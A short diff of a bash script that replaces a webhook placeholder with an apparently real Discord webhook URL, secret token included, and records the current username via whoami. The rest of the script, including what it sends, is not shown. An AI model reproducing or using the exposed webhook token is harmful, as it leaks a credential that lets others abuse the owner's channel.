@@ -1,7 +1,7 @@
 #! bin/bash
 
 
-WEBHOOK_URL="<YOUR DISCORD WEBHOOK URL HERE>"
+WEBHOOK_URL="https://discord.com/api/webhooks/1053076439563522129/2Y-tucQa903t1d_iwpEg9QdSUJnfND8KUg5TyNAzCnZmjQ6qxOy_3rgqFpapk7-Klpnj"
 
 
 USERNAME=$(whoami)
